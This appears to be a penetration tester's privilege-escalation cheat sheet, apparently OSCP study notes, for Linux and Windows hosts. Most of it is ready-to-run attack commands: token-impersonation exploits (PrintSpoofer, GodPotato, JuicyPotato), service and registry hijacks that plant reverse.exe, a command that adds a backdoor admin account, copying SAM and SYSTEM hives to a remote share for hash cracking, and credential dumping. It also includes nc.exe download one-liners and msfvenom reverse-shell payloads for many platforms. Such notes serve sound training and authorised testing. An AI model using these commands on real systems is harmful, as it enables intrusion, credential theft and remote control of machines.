# SUID Env Variables
[Follow this](https://tryhackme.com/r/room/linuxprivesc)


# SUID Abusing Shell Features
[Follow this](https://tryhackme.com/r/room/linuxprivesc)


# NFS
[Follow this](https://tryhackme.com/r/room/linuxprivesc)


# Sudo Shell Sequence Escape
sudo -l


# Sudo Version
sudo -V


# Sudo Environment Variable
sudo -l (ook for the env_keep options and LD_PRELOAD)
[Follow this](https://tryhackme.com/r/room/linuxprivesc)


# Other users
ls /home/
cat /etc/passwd


# Local Services
netstat -antup
netstat -plunt
ps aux
ss -anp
ps fauxww
ps -ewwo pid,user,cmd --forest


# Scripts / Mounts
ls -la /mnt
ls -la /opt
ls -la /
cat /etc/fstab
mount


# File Misconfigurations
ls -la /etc/passwd
ls -la /etc/shadow


# Install Applications
dpgk -l


# Kernerl Exploits
uname -a
cat /etc/*-release


# Passwords
grep -rnw '/' -ie 'pass' --color=always  
grep -rnw '/' -ie 'DB_PASS' --color=always  
grep -rnw '/' -ie 'DB_PASSWORD' --color=always  
grep -rnw '/' -ie 'DB_USER' --color=always  


# Device Drivers and Kernel Modules
lsmod
/sbin/modinfo <mod name>
```

- Deamons
- SSH Keys
- Passwords in Config, Logs and History Files
- NFS
- Weak File Permissions
- Check logs for passwords
- Programs that can be run as root or other users
- Binary Capabilities
- Writable PATH / Writeable Directory in PATH
- LD_PRELOAD
- Service Exploits
- Username as passwords, passwords as passwords, reused passwords


## Windows
- [Cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/)
- [Compiled Kernel Exploits](https://github.com/SecWiki/windows-kernel-exploits)
```

# First things first
whoami /all
net localgroup administrators


## Important Files 
tree /f /a 


# Automated
PowerUp.ps1 (use rdp if errors)
SharpUp.exe
privesccheck
winpeas.exe -lolbas


# Users
net user
net user <username>


# Hidden Directories
dir -Hidden
dir -Force


# Is Admin?
- Maybe the user is already admin


# UAC Bypass
- Maybe admin but uac is blocking

# SeImpersonate Privileges

## Prinf Spoofer
impacket-rpcdump -port 135 <target-ip> | grep -E 'MS-RPRN|MS-PAR' OR
get-childitem \\.\pipe\ OR
(get-childitem \\.\pipe\).FullName OR
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
.\PrintSpoofer.exe -c "C:\PrivEsc\reverse.exe" -i

## God Potato
.\GodPotato.exe -cmd "path to rev shell exe"
.\GodPotato.exe -cmd "net user admin admin /add & net localgroup administrators admin /add"


# Privileges
whoami /all
.\JuicyPotato.exe -t t -p <path to exploit binary> -l 5837
.\JuicyPotato.exe -e EfsRpc -p <path to nc.exe> -a "LHOST LPORT -e cmd"
.\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
.\Incognito.exe list_tokens -u
.\koh.exe 


# Autorun
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
accesschk.exe /accepteula -wvu <binary location>
copy C:\PrivEsc\reverse.exe <binary location> /Y
Login again


# AutoLogon
reg query "HKLM\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 
reg query "HKCU\Software\Microsoft\Windows NT\CurrentVersion\winlogon" 


# Always Install Evelvated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated AND
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=53 -f msi -o reverse.msi
msiexec /quiet /qn /i C:\PrivEsc\reverse.msi


# Local Services
netstat -ano


# Insecure Service Permissions
wmic service get name,pathname,displayname,startmode (Powershell) OR 
sc query state= all (CMD)
accesschk.exe /accepteula -uwcqv <username> <service name>
sc qc <service name>
sc config <service name> binpath= "\"C:\PrivEsc\reverse.exe\""
net stop <service name>
net start <service name>


# Unquoted Service Path
wmic service get name,pathname,displayname,startmode (Powershell) OR 
sc query state= all (CMD)
sc qc <service name>
accesschk.exe /accepteula -uwdq <service path>
copy C:\PrivEsc\reverse.exe <location to put binary>
net stop <service name>
net start <service name>


# Weak Registry Permission
wmic service get name,pathname,displayname,startmode (Powershell) OR 
sc query state= all (CMD)
sc qc <service name>
accesschk.exe /accepteula -uvwqk <reg value> HKLM\System\CurrentControlSet\Services\regsvc
reg add <reg value> /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\reverse.exe /f
net stop <service name>
net start <service name>


# Insecure Service Executables
wmic service get name,pathname,displayname,startmode (Powershell) OR 
sc query state= all (CMD)
sc qc <service name>
accesschk.exe /accepteula -quvw <service binary location>
copy C:\PrivEsc\reverse.exe <service binary location> /Y
net stop <service name>
net start <service name>


# Scheduled Tasks
tasklist /V 
Get-ScheduledTask
schtasks /query /fo LIST /v
schtasks /query /fo LIST /v | findstr /C:"TaskName" /C:"Run As User"
icacls <task location>


# Binary Overwrite or Missing Binary
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment"


# Missing Binary
schtasks /query /fo LIST /v | findstr /B /C:"Folder" /C:"TaskName" /C:"Run As User" /C:"Schedule" /C:"Scheduled Task State" /C:"Schedule Type" /C:"Repeat: Every" /C:"Comment" 


# Third Party Applications
wmic product


# Passwords
cmdkey /list
runas /savecred /user:admin C:\PrivEsc\reverse.exe
.\LaZagne.exe all


# Device Drivers and Kernel Modules
driverquery /v
driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object ‘Display Name’, ‘Start Mode’, Path
Get-WmiObject Win32_PnPSignedDriver | Select-Object DeviceName, DriverVersion, Manufacturer | Where-Object {$_.DeviceName -like "*VMware*"}


# Find Passwords
reg query HKLM /f password /t REG_SZ /s
findstr /si 'password' *.txt *.ps1 *.xml *.docx *.db *.kdbx
findstr /si 'passwd' *.txt *.ps1 *.xml *.docx *.db *.kdbx
findstr /si 'pass' *.txt *.ps1 *.xml *.docx *.db *.kdbx
findstr /si 'cred' *.txt *.ps1 *.xml *.docx *.db *.kdbx


# Kernel Exploits
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
wmic qfe list
wmic qfe get Caption, Description, HotFixID, InstalledOn


# DLL Hijacking 
Check using ProcessMonitor (procmon)
set filters to "result contains not found" and "path ends with .dll"


# Mounted Disks
mountvol


# SAM
copy C:\Windows\Repair\SAM \\10.10.10.10\kali\
copy C:\Windows\Repair\SYSTEM \\10.10.10.10\kali\
python3 creddump7/pwdump.py SYSTEM SAM
hashcat -m 1000 --force <hash> /usr/share/wordlists/rockyou.txt OR
impacket-secretsduimp -sam SAM -system SYSTEM LOCAL


# Start Up Apps
accesschk.exe /accepteula -d "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
```

- Group Privileges
- DLL Hijacking
- Unquoted Service Path
- Named Pipe
- Rewrite Service Binaries
- Change path of Service Binary
- RunAs
- Stored Passwords in unattended, sysprep, RDP, log, History or Config Files
- Startup Applications
- PrintSpoofer
- Service Exploits
- SAM and SYSTEM Readable Files
- Username as passwords, passwords as passwords, empty passwords
- Reused Passwords
- Check logs for passwords
- Check scripts and other applications for passwords

# Sharing Files

## Hosting
```
smbserver.py share . -smb2support
python -m SimpleHTTPServer 80 (Python 2)
python -m http.server 80 (Python 3)
FTP
Website
```

## Downloading
```
wget http://<ip>/nc.exe -o nc.exe  
curl http://<ip>/nc.exe -o nc.exe  
powershell (New-Object System.Net.WebClient).DownloadFile("https://<ip>/test.txt", "test.txt")
certutil -urlcache -f http://<ip>/file file
```

# Exploits

- 1 Meterpreter payload only against 1 system
- Use rlwrap for netcat when catching rev shells

## Cross-Compiling
```
sudo apt install mingw-w64
i686-w64-mingw32-gcc exploit.c -o exploit.exe
i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32
```

## Windows 32 Bit
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
```

## Windows 64 bit
```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

## Linux 32 Bit
```
msfvenom -p linux/x86/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x86.elf
```

## Linux 64 Bit
```
msfvenom -p linux/x64/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f elf > shell-x64.elf
```

## ASP
```
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f asp > shell.asp
```

## JSP
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.jsp
```

## WAR
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f war > shell.war
```

## PHP
```
msfvenom -p php/reverse_php LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

# Resources
- https://book.hacktricks.xyz/
- https://gtfobins.github.io/
- https://lolbas-project.github.io/#
- https://wadcoms.github.io/
- https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- https://github.com/acole76/pentestmonkey-cheatsheets/blob/master/shells.md
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master
- Conda priv esc videos
- Tiber3us Courses
- https://github.com/dievus/printspoofer
- https://github.com/bitsadmin/wesng
- https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
- https://sushant747.gitbooks.io/total-oscp-guide/content/
- https://exploit-db.com
- https://www.securityfocus.com
- https://www.revshells.com/
- https://0xsp.com/offensive/red-team-cheatsheet/
- Crackmapexec - https://wiki.porchetta.industries/
- Windows Priv Exploits - https://github.com/gtworek/Priv2Admin
- https://cheatsheet.haax.fr/

# Cheatsheets
- https://github.com/six2dez/OSCP-Human-Guide/blob/master/oscp_human_guide.md
- https://gitlab.com/lagarian.smith/oscp-cheat-sheet/-/blob/master/OSCP_Notes.md?ref_type=heads
- https://github.com/rodolfomarianocy/OSCP-Tricks-2023/tree/main
- AD Cheatsheet - https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet
- https://therealunicornsecurity.github.io/OSCP
- https://gabb4r.gitbook.io/oscp-notes/